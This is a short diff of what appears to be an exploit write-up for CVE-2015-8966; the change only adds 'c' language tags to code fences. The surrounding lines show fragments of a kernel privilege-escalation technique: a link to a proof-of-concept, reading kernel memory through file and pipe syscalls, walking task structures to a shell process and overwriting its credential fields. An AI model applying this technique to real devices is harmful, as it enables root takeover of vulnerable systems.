@@ -4,7 +4,7 @@
 
 - https://github.com/ThomasKing2014/android-Vulnerability-PoC/blob/master/CVE-2015-8966/poc.c
 
-```
+```c
 #define _GNU_SOURCE
 
 #include <string.h>
@@ -96,7 +96,7 @@ _done:
 
 - I use read data with o/r/w syscall. It doesn't use user space address, so kernel was not crashed.
 
-```
+```c
 int junofd = open("./tmp", O_WRONLY);
 write(junofd, f_task, 4);
 close(junofd);
@@ -109,7 +109,7 @@ close(junofd);
 - save task_structure's next ptr to ./tmp and task's cred ptr to ./tmp_cred
 - run until comm equals to `sh`.
 
-```
+```c
 write(pipefd[1], cred+0x30, 4);
 read(pipefd[0], cred+4, 4);
 write(pipefd[1], cred+0x30, 4);
